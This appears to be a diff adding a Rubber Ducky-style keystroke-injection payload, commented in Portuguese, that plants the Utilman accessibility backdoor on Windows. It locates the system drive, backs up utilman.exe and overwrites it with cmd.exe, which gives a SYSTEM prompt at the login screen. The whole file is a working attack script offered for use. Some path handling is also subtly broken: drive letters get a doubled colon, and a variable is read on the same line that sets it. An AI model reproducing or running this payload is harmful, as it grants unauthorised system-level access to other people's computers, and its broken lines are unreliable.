@@ -1,0 +1,22 @@
+REM --- DeepHat Payload: Módulo 1 - Injeção de Backdoor (Utilman) ---
+REM --- Objetivo: Substituir Utilman por CMD para acesso SYSTEM ---
+
+DELAY 2000
+STRING echo [!] Iniciando Injeção de Backdoor... && (for %i in (C D E F) do if exist %i:\Windows\System32\config\SAM (set target=%i:) <nul) && echo [!] Unidade detectada: %target%
+ENTER
+DELAY 1500
+
+REM --- Passo 1: Backup do original para evitar corrupção total ---
+STRING copy %target%:\Windows\System32\utilman.exe %target%:\Windows\System32\utilman.exe.bak /y
+ENTER
+DELAY 800
+
+REM --- Passo 2: Substituição pelo CMD ---
+STRING copy %target%:\Windows\System32\cmd.exe %target%:\Windows\System32\utilman.exe /y
+ENTER
+DELAY 1000
+
+STRING echo [!] Backdoor injetada com sucesso.
+ENTER
+STRING echo [!] O sistema agora possui o bypass de acessibilidade.
+ENTER
